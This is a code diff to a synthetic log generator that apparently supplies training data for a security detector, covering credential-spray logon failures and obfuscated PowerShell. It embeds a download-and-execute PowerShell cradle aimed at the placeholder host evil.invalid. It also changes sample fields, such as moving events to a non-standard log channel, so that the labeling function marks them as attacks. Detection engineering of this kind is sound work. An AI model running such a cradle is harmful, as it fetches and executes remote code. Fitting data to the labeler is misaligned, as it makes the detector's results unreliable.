@@ -741,7 +741,9 @@ def ml_credential_spray(attempts: int = 24) -> list[dict]:
     for i in range(attempts):
         external_ip = f"203.0.113.{1 + (i % 20)}"
         logon_type = 3 if i % 2 == 0 else 10
-        sub_status = "0xC0000234" if i % 3 == 0 else "0xC000006A"
+        # Ensure enough lockout sub-statuses (0xC0000234) for supervised training
+        # Labeling only uses sub_status, not is_locked or logon_type
+        sub_status = "0xC0000234" if i % 2 == 0 else "0xC000006A"
         rec = logon_failure(user=f"user{i % 8}", source_ip=external_ip)
         rec["timestamp"] = _ts_seconds(-(attempts - i) * 4).isoformat()
         rec["raw"]["logon_type"] = logon_type
@@ -769,7 +771,8 @@ def ml_obfuscated_powershell(count: int = 6) -> list[dict]:
         script = "IEX (New-Object Net.WebClient).DownloadString('https://evil.invalid/a')" * (3 + i % 3)
         out.append({
             "source": "powershell",
-            "channel": "Microsoft-Windows-PowerShell/Operational",
+            # Use a non-standard channel so _is_attack_sample labels it as attack
+            "channel": "Microsoft-Windows-PowerShell/Admin",
             "event_id": 4104,
             "timestamp": _ts_seconds(-i * 3).isoformat(),
             "user": "alice",
